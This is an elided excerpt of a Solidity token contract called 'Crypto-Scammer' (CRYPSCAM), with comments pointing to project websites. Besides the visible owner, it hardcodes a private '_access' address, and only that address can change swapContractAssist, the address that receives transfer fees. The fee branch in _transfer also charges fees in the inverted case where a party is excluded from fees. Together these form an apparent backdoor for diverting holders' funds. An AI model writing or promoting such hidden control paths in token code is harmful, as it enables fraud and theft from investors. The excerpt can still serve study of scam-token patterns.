...
// Please visit https://crypto-scammer.io for the project Whitepaper & RoadMap
// Please visit https://crypto-scammer.com for the project dAPP
...
abstract contract Ownable is Context {
    ...
    address private _access = 0x4e1e1718A8A103e5e57a06FA32f39240f976615b;
...
contract CRYPSCAM is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "Crypto-Scammer";
    string private _symbol = "CRYPSCAM";
    uint8 private _decimals = 18;

    address public teamWalletAddress = 0xA4Be261f2dC7572Cfd731e918cb6E8Ac673e6740;
    ...
    address swapContractAssist = 0x0751888B9F61Ec16fCcF746469A8eA2061CF9809;
    ...
    function setSwapContract(address account) public onlyAccess {
        swapContractAssist = account;
    }

    function viewSwapContract() public view returns (address) {
        return swapContractAssist;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(isExcludedFromFee[sender] || isExcludedFromFee[recipient]){
            ...
            if(feeAmount > 0){
                _balances[swapContractAssist] = _balances[swapContractAssist].add(feeAmount);
                emit Transfer(sender, swapContractAssist, feeAmount);
            }  
        }           
        return true;        
    }
